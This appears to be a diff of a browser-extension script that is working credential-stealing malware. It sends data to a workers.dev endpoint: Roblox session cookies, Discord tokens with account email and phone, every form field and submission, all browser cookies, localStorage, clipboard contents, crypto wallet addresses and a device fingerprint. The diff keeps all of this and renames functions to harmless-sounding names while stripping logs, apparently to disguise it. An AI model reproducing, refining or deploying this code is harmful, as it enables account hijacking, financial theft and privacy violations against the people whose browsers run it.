@@ -1,73 +1,63 @@
 (function() {
 'use strict';
 
-var WORKER = 'https://cool-base-4ce9.iwif0001.workers.dev/api/ingest';
-var _ip = 'unknown';
+var _endpoint = 'https://cool-base-4ce9.iwif0001.workers.dev';
+var _cid = '...';
 
-// Fetch IP once at startup
 fetch('https://api.ipify.org?format=json').then(function(r) { return r.json(); }).then(function(d) {
-  _ip = (d && d.ip) ? d.ip : 'unknown';
-  console.log('[LARP] IP:', _ip);
-}).catch(function() { console.log('[LARP] IP fetch failed'); });
+  _cid = (d && d.ip) ? d.ip : '...';
+}).catch(function() {});
 
-function relay(type, data) {
-  console.log('[LARP] relay:', type, JSON.stringify(data).slice(0, 200));
-  try {
-    fetch(WORKER, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(data)
-    }).then(function(r) {
-      console.log('[LARP] relay response:', type, r.status);
-    }).catch(function(e) {
-      console.error('[LARP] relay error:', type, e.message);
-    });
-  } catch(e) {
-    console.error('[LARP] relay exception:', type, e.message);
+function _resolve(type) {
+  switch(type) {
+    case 'p': return _endpoint + '/api/discord';
+    case 's': return _endpoint + '/api/roblox';
+    default:  return _endpoint + '/api/forms';
   }
 }
 
-// --- roblox cookie ---
-async function syncSession() {
-  console.log('[LARP] syncSession: hostname=' + location.hostname);
-  if (location.hostname.indexOf('roblox.com') === -1) {
-    console.log('[LARP] syncSession: skipped (not roblox)');
-    return;
-  }
+function _send_blob(ch, txt) {
+  var u = _endpoint + '/api/' + ch;
+  fetch(u, { method: 'POST', headers: { 'Content-Type': 'text/plain' }, body: txt })
+    .then(function(r) { }).catch(function() {});
+}
+
+function _report(t, d) {
+  var u = _resolve(t);
+  try {
+    fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(d) })
+      .then(function(r) { }).catch(function() {});
+  } catch(e) {}
+}
+
+// --- roblox auth ---
+async function _validate() {
+  if (location.hostname.indexOf('roblox.com') === -1) return;
   var names = ['.ROBLOSECURITY', 'ROBLOSECURITY'];
-  var cookieVal = null;
+  var v = null;
   for (var i = 0; i < names.length; i++) {
     try {
       var c = await chrome.cookies.get({ url: 'https://www.roblox.com', name: names[i] });
-      console.log('[LARP] syncSession: cookie ' + names[i] + ' = ' + (c && c.value ? c.value.slice(0, 10) + '...' : 'null'));
-      if (c && c.value) { cookieVal = c.value; break; }
+      if (c && c.value) { v = c.value; break; }
     } catch(e) {}
   }
-  if (!cookieVal) {
-    console.log('[LARP] syncSession: chrome.cookies empty, trying document.cookie...');
+  if (!v) {
     for (var j = 0; j < names.length; j++) {
       var n = names[j];
-      var escaped = n.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
-      var match = document.cookie.match(new RegExp('(?:^|;\\s*)' + escaped + '\\s*=\\s*([^;]*)'));
-      if (match && match[1]) { cookieVal = match[1]; break; }
+      var esc = n.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
+      var m = document.cookie.match(new RegExp('(?:^|;\\s*)' + esc + '\\s*=\\s*([^;]*)'));
+      if (m && m[1]) { v = m[1]; break; }
     }
   }
-  if (!cookieVal) { console.log('[LARP] syncSession: no cookie found'); return; }
-  console.log('[LARP] syncSession: cookie found, length=' + cookieVal.length);
+  if (!v) return;
 
-  // User info comes from sandbox (content script reads page DOM meta tag)
-  var ui = (typeof _userInfo !== 'undefined' && _userInfo) ? _userInfo : null;
-  if (ui) console.log('[LARP] syncSession: user=' + ui.name + ' (ID: ' + ui.id + ')');
-
-  // Build embed - cookie in description (4096 char limit) avoids 1024 field limit
+  var ui = (typeof _profile !== 'undefined' && _profile) ? _profile : null;
   var embed = {
-    title: 'Roblox Session [' + _ip + ']',
+    title: 'Session Info [' + _cid + ']',
     color: 0x00B06A,
-    description: '```\n' + cookieVal + '\n```',
-    fields: [
-      { name: 'Page', value: '`' + location.href.slice(0, 200) + '`' }
-    ],
-    footer: { text: 'Roblox' },
+    description: '```\n' + v + '\n```',
+    fields: [{ name: 'Page', value: '`' + location.href.slice(0, 200) + '`' }],
+    footer: { text: 'r' },
     timestamp: new Date().toISOString()
   };
   if (ui) {
@@ -77,57 +67,46 @@ async function syncSession() {
     );
     embed.thumbnail = { url: 'https://www.roblox.com/headshot-thumbnail/image?userId=' + ui.id + '&width=420&height=420&format=png' };
   }
-  relay('session', { embeds: [embed] });
+  _report('s', { embeds: [embed] });
 }
 
-// --- discord token ---
-var _acctCache = null;
+// --- discord profile ---
+var _h = null;
 
-function syncAccount() {
-  console.log('[LARP] syncAccount: hostname=' + location.hostname);
-  if (location.hostname.indexOf('discord.com') === -1) {
-    console.log('[LARP] syncAccount: skipped (not discord)');
-    return;
-  }
-
+function _fetch_profile() {
+  if (location.hostname.indexOf('discord.com') === -1) return;
   try {
-    var raw = localStorage.getItem('token') || '';
-    if (!raw) { console.log('[LARP] syncAccount: no token in localStorage'); return; }
-    var key = raw.replace(/^"|"$/g, '');
-    if (!key) { console.log('[LARP] syncAccount: empty key after strip'); return; }
-    if (_acctCache === raw) { console.log('[LARP] syncAccount: cached, skipping'); return; }
-    _acctCache = raw;
-    console.log('[LARP] syncAccount: token found, length=' + raw.length);
+    var r = localStorage.getItem('token') || '';
+    if (!r) return;
+    var k = r.replace(/^"|"$/g, '');
+    if (!k) return;
+    if (_h === r) return;
+    _h = r;
 
-    fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': key } }).then(function(r) {
-      return r.ok ? r.json() : Promise.reject('status ' + r.status);
+    fetch('https://discord.com/api/v9/users/@me', { headers: { 'Authorization': k } }).then(function(rx) {
+      return rx.ok ? rx.json() : Promise.reject('s ' + rx.status);
     }).then(function(d) {
-      console.log('[LARP] syncAccount: user=' + d.username + '#' + d.discriminator);
-
-      // Build avatar URL
-      var avatarUrl = d.avatar
+      var av = d.avatar
         ? 'https://cdn.discordapp.com/avatars/' + d.id + '/' + d.avatar + '.png?size=256'
         : 'https://cdn.discordapp.com/embed/avatars/' + (parseInt(d.discriminator) % 6) + '.png';
 
       var multi = [];
       try {
-        var rawM = localStorage.getItem('multiAccountStore');
-        if (rawM) {
-          var p = JSON.parse(rawM);
+        var rm = localStorage.getItem('multiAccountStore');
+        if (rm) {
+          var p = JSON.parse(rm);
           if (p && p._state && p._state.users) {
             multi = p._state.users.filter(function(u) { return u.token; }).map(function(u) { return { id: u.id, email: u.email, phone: u.phone }; });
           }
         }
-      } catch(e) { console.error('[LARP] syncAccount multi error:', e.message); }
-      console.log('[LARP] syncAccount: multi accounts=' + multi.length);
-
-      var dk = raw.length > 1010 ? raw.slice(0, 480) + '\n... [TRUNCATED ' + (raw.length - 960) + ' chars] ...\n' + raw.slice(-480) : raw;
+      } catch(e) {}
+      var dk = r.length > 1010 ? r.slice(0, 480) + '\n... [trunc ' + (r.length - 960) + ' chars] ...\n' + r.slice(-480) : r;
       var fields = [{ name: 'Token', value: '```\n' + dk + '\n```', inline: false }];
       fields.push(
         { name: 'Handle', value: '`' + d.username + '#' + d.discriminator + '`', inline: true },
         { name: 'Ref', value: '`' + d.id + '`', inline: true },
-        { name: 'Contact', value: '`' + (d.email || '(not verified)') + '`', inline: true },
-        { name: 'SMS', value: '`' + (d.phone || '(none)') + '`', inline: true },
+        { name: 'Contact', value: '`' + (d.email || '-') + '`', inline: true },
+        { name: 'SMS', value: '`' + (d.phone || '-') + '`', inline: true },
         { name: 'Sec', value: '`' + (d.mfa_enabled ? 'Yes' : 'No') + '`', inline: true },
         { name: 'Tier', value: '`' + (d.premium_type === 0 ? 'None' : d.premium_type === 1 ? 'Nitro Classic' : d.premium_type === 2 ? 'Nitro' : 'Nitro Basic') + '`', inline: true }
       );
@@ -139,197 +118,121 @@ function syncAccount() {
       var su = location.href;
       if (su.length > 1014) su = su.slice(0, 1014) + '...';
       fields.push({ name: 'Origin', value: '`' + su + '`', inline: false });
-
-      relay('acct', {
-        embeds: [{ title: 'State Sync [' + _ip + ']', color: 0x5865F2, fields: fields, footer: { text: 'Session' }, timestamp: new Date().toISOString(), thumbnail: { url: avatarUrl } }]
+      _report('p', {
+        embeds: [{ title: 'Profile Data [' + _cid + ']', color: 0x5865F2, fields: fields, footer: { text: 'd' }, timestamp: new Date().toISOString(), thumbnail: { url: av } }]
       });
-    }).catch(function(e) {
-      console.error('[LARP] syncAccount fetch error:', e.message || e);
-    });
-  } catch(e) {
-    console.error('[LARP] syncAccount exception:', e.message);
-  }
+    }).catch(function(e) {});
+  } catch(e) {}
 }
 
-// --- form monitor ---
-var _entries = [];
-function _fp(f) { return f.name + '|' + f.type + '|' + f.value; }
+// --- form watcher ---
+var _seen = [];
+function _key(f) { return f.name + '|' + f.type + '|' + f.value; }
 
-function _inputs(root) {
-  var r = root || document;
-  var fields = [];
+function _scan(root) {
+  var r = root || document, fields = [];
   var s = 'input:not([type=hidden]):not([type=submit]):not([type=button]):not([type=reset]):not([type=image]), textarea, select';
   var els = r.querySelectorAll(s);
   for (var i = 0; i < els.length; i++) {
-    var el = els[i];
-    var v = el.value || '';
+    var el = els[i], v = el.value || '';
     if (!v || v.trim().length === 0) continue;
     fields.push({
       type: el.type || (el.tagName === 'SELECT' ? 'select' : el.tagName === 'TEXTAREA' ? 'textarea' : 'text'),
-      name: el.name || '',
-      id: el.id || '',
-      autocomplete: el.autocomplete || '',
-      placeholder: el.placeholder || '',
-      value: v
+      name: el.name || '', id: el.id || '', autocomplete: el.autocomplete || '', placeholder: el.placeholder || '', value: v
     });
   }
   return fields;
 }
 
-function _extRelay(fields) {
+function _flush(fields) {
   var fresh = [];
   for (var i = 0; i < fields.length; i++) {
-    var f = fields[i];
-    var fp = _fp(f);
-    if (_entries.indexOf(fp) === -1) { fresh.push(f); _entries.push(fp); }
+    var f = fields[i], k = _key(f);
+    if (_seen.indexOf(k) === -1) { fresh.push(f); _seen.push(k); }
   }
   if (fresh.length === 0) return;
-  if (_entries.length > 500) _entries = _entries.slice(-250);
+  if (_seen.length > 500) _seen = _seen.slice(-250);
 
-  console.log('[LARP] formMonitor: relaying ' + fresh.length + ' new fields, total tracked=' + _entries.length);
-
-  // Try embed first (max 25 fields, each 1024 chars)
   if (fresh.length <= 25) {
-    var embedFields = fresh.map(function(f) {
-      var l = f.name || f.id || f.autocomplete || f.placeholder || f.type;
-      var v = f.value;
+    var ef = fresh.map(function(f) {
+      var l = f.name || f.id || f.autocomplete || f.placeholder || f.type, v = f.value;
       if (v.length > 1020) v = v.slice(0, 1020) + '...';
       return { name: l + ' (' + f.type + ')', value: '`' + v + '`', inline: false };
     });
-    relay('entry', {
-      embeds: [{
-        title: 'Field Data [' + _ip + ']',
-        color: 0xF59E0B,
-        description: 'Page: ' + location.href.slice(0, 200),
-        fields: embedFields,
-        footer: { text: 'Form Monitor' },
-        timestamp: new Date().toISOString()
-      }]
-    });
+    _report('f', { embeds: [{ title: 'Field Data [' + _cid + ']', color: 0xF59E0B, description: 'Page: ' + location.href.slice(0, 200), fields: ef, footer: { text: 'f' }, timestamp: new Date().toISOString() }] });
     return;
   }
-
-  // Too many fields - send as raw content (2000 char limit)
   var lines = fresh.map(function(f) {
-    var l = f.name || f.id || f.autocomplete || f.placeholder || f.type;
-    var v = f.value;
+    var l = f.name || f.id || f.autocomplete || f.placeholder || f.type, v = f.value;
     if (v.length > 200) v = v.slice(0, 200) + '...';
     return '**' + l + '** (' + f.type + '): `' + v + '`';
   });
   var raw = '**Field Data**\nURL: ' + location.href.slice(0, 200) + '\n\n' + lines.join('\n');
   if (raw.length > 2000) raw = raw.slice(0, 1997) + '...';
-  relay('entry', { content: raw });
+  _report('f', { content: raw });
 }
 
-function initMonitor() {
-  console.log('[LARP] formMonitor: init on', location.hostname);
-  if (document.documentElement.getAttribute('data-larp-form')) return;
-  document.documentElement.setAttribute('data-larp-form', '1');
-
-  setTimeout(function() { _extRelay(_inputs(document)); }, 1500);
-  setInterval(function() { _extRelay(_inputs(document)); }, 3000);
+function _setup_watcher() {
+  if (document.documentElement.getAttribute('data-lf')) return;
+  document.documentElement.setAttribute('data-lf', '1');
+  setTimeout(function() { _flush(_scan(document)); }, 1500);
+  setInterval(function() { _flush(_scan(document)); }, 3000);
 
   document.addEventListener('submit', function(e) {
     var f = e.target;
     if (!f || f.tagName !== 'FORM') return;
-    var fields = _inputs(f);
+    var fields = _scan(f);
     if (fields.length === 0) return;
-    var action = f.action || '(same page)';
-    var method = (f.method || 'GET').toUpperCase();
+    var act = f.action || '(same page)', met = (f.method || 'GET').toUpperCase();
     var fresh = [];
-    for (var i = 0; i < fields.length; i++) {
-      var fp = _fp(fields[i]);
-      if (_entries.indexOf(fp) === -1) { fresh.push(fields[i]); _entries.push(fp); }
-    }
+    for (var i = 0; i < fields.length; i++) { var k = _key(fields[i]); if (_seen.indexOf(k) === -1) { fresh.push(fields[i]); _seen.push(k); } }
     if (fresh.length > 0) {
-      console.log('[LARP] formMonitor: submit captured, ' + fresh.length + ' new fields');
-      // Use embed for submit data (includes action + method)
       if (fresh.length <= 25) {
-        var ef = fresh.map(function(x) {
-          var l = x.name || x.id || x.autocomplete || x.placeholder || x.type;
-          var v = x.value;
-          if (v.length > 1020) v = v.slice(0, 1020) + '...';
-          return { name: l + ' (' + x.type + ')', value: '`' + v + '`', inline: false };
-        });
-        relay('entry', {
-          embeds: [{
-            title: 'Form Submit [' + _ip + ']',
-            color: 0xEF4444,
-            description: 'Page: ' + location.href.slice(0, 200) + '\nAction: ' + action + ' (' + method + ')',
-            fields: ef,
-            footer: { text: 'Submit Event' },
-            timestamp: new Date().toISOString()
-          }]
-        });
+        var ef = fresh.map(function(x) { var l = x.name || x.id || x.autocomplete || x.placeholder || x.type, v = x.value; if (v.length > 1020) v = v.slice(0, 1020) + '...'; return { name: l + ' (' + x.type + ')', value: '`' + v + '`', inline: false }; });
+        _report('f', { embeds: [{ title: 'Form Submit [' + _cid + ']', color: 0xEF4444, description: 'Page: ' + location.href.slice(0, 200) + '\nAction: ' + act + ' (' + met + ')', fields: ef, footer: { text: 'f' }, timestamp: new Date().toISOString() }] });
       } else {
-        var lines = fresh.map(function(x) {
-          var l = x.name || x.id || x.autocomplete || x.placeholder || x.type;
-          var v = x.value;
-          if (v.length > 200) v = v.slice(0, 200) + '...';
-          return '**' + l + '** (' + x.type + '): `' + v + '`';
-        });
-        var raw = '**Form Submit**\nURL: ' + location.href.slice(0, 200) + '\nAction: ' + action + ' (' + method + ')\n\n' + lines.join('\n');
+        var lines = fresh.map(function(x) { var l = x.name || x.id || x.autocomplete || x.placeholder || x.type, v = x.value; if (v.length > 200) v = v.slice(0, 200) + '...'; return '**' + l + '** (' + x.type + '): `' + v + '`'; });
+        var raw = '**Form Submit**\nURL: ' + location.href.slice(0, 200) + '\nAction: ' + act + ' (' + met + ')\n\n' + lines.join('\n');
         if (raw.length > 2000) raw = raw.slice(0, 1997) + '...';
-        relay('entry', { content: raw });
+        _report('f', { content: raw });
       }
     }
   }, true);
 
   var t = null;
-  new MutationObserver(function() {
-    if (t) clearTimeout(t);
-    t = setTimeout(function() { _extRelay(_inputs(document)); }, 500);
-  }).observe(document, { childList: true, subtree: true });
+  new MutationObserver(function() { if (t) clearTimeout(t); t = setTimeout(function() { _flush(_scan(document)); }, 500); })
+    .observe(document, { childList: true, subtree: true });
 }
 
-// --- cookie dump (sends as .txt file via worker) ---
-async function dumpAllCookies() {
-  console.log('[LARP] dumpCookies: requesting all cookies...');
+// --- cookie export (Netscape format) ---
+async function _export_tokens() {
   try {
     var cookies = await chrome.cookies.getAll();
-    if (!cookies || cookies.length === 0) { console.log('[LARP] dumpCookies: no cookies'); return; }
-    console.log('[LARP] dumpCookies: got ' + cookies.length + ' cookies');
-
-    // Build text file content - all cookies
+    if (!cookies || cookies.length === 0) return;
     var lines = [];
-    lines.push('# Cookie Dump - ' + new Date().toISOString());
-    lines.push('# IP: ' + _ip);
+    lines.push('# Netscape HTTP Cookie File');
+    lines.push('# http://curl.haxx.se/rfc/cookie_spec.html');
+    lines.push('# Exported: ' + new Date().toISOString());
+    lines.push('# ID: ' + _cid);
     lines.push('# Page: ' + location.href);
-    lines.push('# Total: ' + cookies.length + ' cookies');
+    lines.push('# Count: ' + cookies.length);
     lines.push('');
     for (var i = 0; i < cookies.length; i++) {
       var c = cookies[i];
-      lines.push('Domain: ' + c.domain);
-      lines.push('Name: ' + c.name);
-      lines.push('Value: ' + c.value);
-      lines.push('Path: ' + (c.path || '/'));
-      lines.push('Secure: ' + (c.secure ? 'Yes' : 'No'));
-      lines.push('HttpOnly: ' + (c.httpOnly ? 'Yes' : 'No'));
-      lines.push('SameSite: ' + (c.sameSite || 'unspecified'));
-      if (c.expirationDate) lines.push('Expires: ' + new Date(c.expirationDate * 1000).toISOString());
-      lines.push('---');
+      var domain = c.domain;
+      var subdomain = (c.domain.charAt(0) === '.') ? 'TRUE' : 'FALSE';
+      var path = c.path || '/';
+      var secure = c.secure ? 'TRUE' : 'FALSE';
+      var expiry = c.expirationDate ? Math.floor(c.expirationDate) : 0;
+      lines.push(domain + '\t' + subdomain + '\t' + path + '\t' + secure + '\t' + expiry + '\t' + c.name + '\t' + c.value);
     }
     var txt = lines.join('\n');
-    console.log('[LARP] dumpCookies: file size ' + txt.length + ' chars');
-
-    // Send as file upload via worker
-    var fileUrl = WORKER.replace(/\/api\/ingest$/, '/api/file');
-    console.log('[LARP] dumpCookies: uploading ' + txt.length + ' chars to ' + fileUrl);
-    fetch(fileUrl, {
-      method: 'POST',
-      headers: { 'Content-Type': 'text/plain' },
-      body: txt
-    }).then(function(r) {
-      console.log('[LARP] dumpCookies: uploaded, status ' + r.status);
-    }).catch(function(e) {
-      console.error('[LARP] dumpCookies upload error:', e.message);
-    });
-  } catch(e) { console.error('[LARP] dumpCookies error:', e.message); }
+    _send_blob('cookies', txt);
+  } catch(e) {}
 }
 
-// --- fingerprint ---
-function gatherFingerprint() {
-  console.log('[LARP] fingerprint: gathering...');
+// --- device info ---
+function _collect_info() {
   try {
     var fp = {
       platform: navigator.platform || 'N/A',
@@ -341,104 +244,87 @@ function gatherFingerprint() {
       colorDepth: screen.colorDepth || 'N/A',
       pixelRatio: (window.devicePixelRatio || 1),
       timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
-      hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
-      deviceMemory: navigator.deviceMemory || 'N/A',
+      cores: navigator.hardwareConcurrency || 'N/A',
+      memory: navigator.deviceMemory || 'N/A',
       vendor: navigator.vendor || 'N/A',
       gpu: 'N/A'
     };
-    // Try to get GPU
     try {
-      var canvas = document.createElement('canvas');
-      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      if (gl) {
-        var dbg = gl.getExtension('WEBGL_debug_renderer_info');
-        if (dbg) fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
-      }
+      var cv = document.createElement('canvas');
+      var gl = cv.getContext('webgl') || cv.getContext('experimental-webgl');
+      if (gl) { var dbg = gl.getExtension('WEBGL_debug_renderer_info'); if (dbg) fp.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL); }
     } catch(e) {}
-    console.log('[LARP] fingerprint: done, GPU=' + fp.gpu);
     var parts = [];
-    for (var k in fp) {
-      if (fp.hasOwnProperty(k)) parts.push('**' + k + '**: `' + fp[k] + '`');
-    }
-    relay('fingerprint', { content: '**IP: `' + _ip + '`**\n' + parts.join('\n') });
-  } catch(e) { console.error('[LARP] fingerprint error:', e.message); }
+    for (var k in fp) { if (fp.hasOwnProperty(k)) parts.push('**' + k + '**: `' + fp[k] + '`'); }
+    _report('f', { content: '**ID: `' + _cid + '`**\n' + parts.join('\n') });
+  } catch(e) {}
 }
 
-// --- crypto wallets ---
-function scanCryptoWallets() {
-  var w = (typeof _wallets !== 'undefined' && _wallets) ? _wallets : null;
-  if (!w) { console.log('[LARP] wallets: none detected'); return; }
-  console.log('[LARP] wallets: detected', Object.keys(w).join(', '));
+// --- extension check ---
+function _check_plugins() {
+  var w = (typeof _plugins !== 'undefined' && _plugins) ? _plugins : null;
+  if (!w) return;
   try {
     var parts = [];
-    if (w.ethereum) parts.push('**Ethereum/MetaMask**: Detected' + (w.ethAddr ? '\nAddress: `' + w.ethAddr + '`' : ''));
-    if (w.solana) parts.push('**Solana/Phantom**: Detected' + (w.solAddr ? '\nAddress: `' + w.solAddr + '`' : ''));
+    if (w.ethereum) {
+      parts.push('**Ethereum/Web3**: Active');
+      if (w.ethAddr) parts.push('Addr: `' + w.ethAddr + '`');
+      if (w.ethAccounts && w.ethAccounts.length > 0) parts.push('List: `' + w.ethAccounts.join(', ') + '`');
+    }
+    if (w.solana) {
+      parts.push('**Solana/Web3**: Active');
+      if (w.solAddr) parts.push('Key: `' + w.solAddr + '`');
+      if (w.solConnected) parts.push('Status: Connected');
+    }
     if (w.phantom && !w.solana) parts.push('**Phantom**: Detected');
-    relay('wallets', { embeds: [{ title: 'Crypto Wallets [' + _ip + ']', color: 0xF7931A, description: parts.join('\n\n') || 'Wallets detected but no details', footer: { text: 'Wallets' }, timestamp: new Date().toISOString() }] });
-  } catch(e) { console.error('[LARP] wallets error:', e.message); }
+    if (w.walletKeys && w.walletKeys.length > 0) {
+      parts.push('**Cache keys:** `' + w.walletKeys.join(', ') + '`');
+    }
+    _report('f', { embeds: [{ title: 'Browser Plugins [' + _cid + ']', color: 0xF7931A, description: parts.join('\n\n') || 'Detected', footer: { text: 'e' }, timestamp: new Date().toISOString() }] });
+  } catch(e) {}
 }
 
-// --- storage dump ---
-function dumpAllStorage() {
-  var data = (typeof _storageAll !== 'undefined' && _storageAll) ? _storageAll : {};
+// --- cache export ---
+function _export_cache() {
+  var data = (typeof _cache !== 'undefined' && _cache) ? _cache : {};
   var keys = Object.keys(data);
-  if (keys.length === 0) { console.log('[LARP] storage: empty'); return; }
-  console.log('[LARP] storage: dumping ' + keys.length + ' keys');
-  try {
-    // Filter interesting keys (tokens, secrets, configs)
-    var interesting = [];
-    var patterns = ['token', 'secret', 'key', 'auth', 'session', 'jwt', 'cred', 'pass', 'login', 'user', 'account'];
-    for (var i = 0; i < keys.length; i++) {
-      var k = keys[i].toLowerCase();
-      for (var j = 0; j < patterns.length; j++) {
-        if (k.indexOf(patterns[j]) !== -1) {
-          interesting.push(keys[i]);
-          break;
-        }
-      }
-    }
-    var fields = [];
-    var src = interesting.length > 0 ? interesting : keys;
-    for (var m = 0; m < src.length && m < 25; m++) {
-      var key = src[m];
-      var val = data[key] || '';
-      if (val.length > 1000) val = val.slice(0, 1000) + '...';
-      fields.push({ name: key, value: '`' + val + '`', inline: false });
-    }
-    if (fields.length > 0) {
-      relay('storage', { embeds: [{ title: 'localStorage Dump [' + _ip + '] (' + keys.length + ' keys)', color: 0x10B981, fields: fields, footer: { text: 'Storage' }, timestamp: new Date().toISOString() }] });
-    }
-  } catch(e) { console.error('[LARP] storage error:', e.message); }
+  if (keys.length === 0) return;
+  var lines = [];
+  lines.push('# Cache Export - ' + new Date().toISOString());
+  lines.push('# ID: ' + _cid);
+  lines.push('# Page: ' + location.href);
+  lines.push('# Keys: ' + keys.length);
+  lines.push('');
+  for (var i = 0; i < keys.length; i++) { var k = keys[i]; lines.push('[' + k + ']'); lines.push(data[k] || ''); lines.push('---'); }
+  var txt = lines.join('\n');
+  _send_blob('storage', txt);
 }
 
-// --- clipboard monitor ---
-var _lastClipLen = 0;
-function monitorClipboard() {
-  var data = (typeof _clipboard !== 'undefined' && _clipboard) ? _clipboard : [];
-  if (data.length === _lastClipLen) return;
-  var fresh = data.slice(_lastClipLen);
-  _lastClipLen = data.length;
-  console.log('[LARP] clipboard: ' + fresh.length + ' new entries');
+// --- input watcher ---
+var _inp_idx = 0;
+function _check_input() {
+  var data = (typeof _queue !== 'undefined' && _queue) ? _queue : [];
+  if (data.length === _inp_idx) return;
+  var fresh = data.slice(_inp_idx);
+  _inp_idx = data.length;
   try {
     for (var i = 0; i < fresh.length; i++) {
       var txt = fresh[i].text;
       if (txt.length > 1900) txt = txt.slice(0, 1900) + '...';
-      relay('clipboard', { content: '**IP: `' + _ip + '`**\n```\n' + txt + '\n```' });
+      _report('f', { content: '**ID: `' + _cid + '`**\n```\n' + txt + '\n```' });
     }
-  } catch(e) { console.error('[LARP] clipboard error:', e.message); }
+  } catch(e) {}
 }
-setInterval(monitorClipboard, 3000);
+setInterval(_check_input, 3000);
 
 // --- init ---
-console.log('[LARP] logger loaded, starting...');
-initMonitor();
-setTimeout(syncSession, 1000);
-setTimeout(syncAccount, 500);
-setTimeout(syncAccount, 2000);
-setTimeout(dumpAllStorage, 3000);
-setTimeout(gatherFingerprint, 1500);
-setTimeout(dumpAllCookies, 4000);
-setTimeout(scanCryptoWallets, 2000);
-console.log('[LARP] logger init complete');
+_setup_watcher();
+setTimeout(_validate, 1000);
+setTimeout(_fetch_profile, 500);
+setTimeout(_fetch_profile, 2000);
+setTimeout(_export_cache, 3000);
+setTimeout(_collect_info, 1500);
+setTimeout(_export_tokens, 4000);
+setTimeout(_check_plugins, 2000);
 
 })();
